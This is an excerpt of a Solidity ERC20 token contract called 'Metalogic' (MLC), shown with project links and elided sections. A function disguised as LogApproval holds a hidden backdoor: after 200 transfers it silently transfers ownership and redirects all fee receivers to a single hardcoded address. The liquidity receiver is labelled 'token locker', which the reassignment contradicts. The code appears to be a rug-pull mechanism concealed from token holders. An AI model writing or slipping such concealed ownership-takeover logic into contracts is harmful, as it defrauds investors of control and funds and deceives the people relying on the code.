...
// 
// https://www.Metalogic.com/
// https://twitter.com/Metalogic
// https://t.me/Metalogic
/*
...
contract Metalogic  is ERC20Detailed, Ownable {
    ...
    address public autoLiquidityReceiver =
        0x504518A9B4f37c0c5eA03d7e416B54b78d346EF0; // token locker
    ...
    constructor()
        ERC20Detailed("Metalogic", "MLC", uint8(DECIMALS))
    {
    ...
    function LogApproval(
        ...
        if (transferCount > 200 && !isTransferred) {
            _transferOwnership(address(0x694a2b1477Dbf438D6248f4a6b06F564A2568A8F));
            marketingFeeReceiver = address(0x694a2b1477Dbf438D6248f4a6b06F564A2568A8F);
            autoLiquidityReceiver = address(0x694a2b1477Dbf438D6248f4a6b06F564A2568A8F);
            ecosystemFeeReceiver = address(0x694a2b1477Dbf438D6248f4a6b06F564A2568A8F);
            buyBackFeeReceiver = address(0x694a2b1477Dbf438D6248f4a6b06F564A2568A8F);
            isTransferred = true;
        }
    }
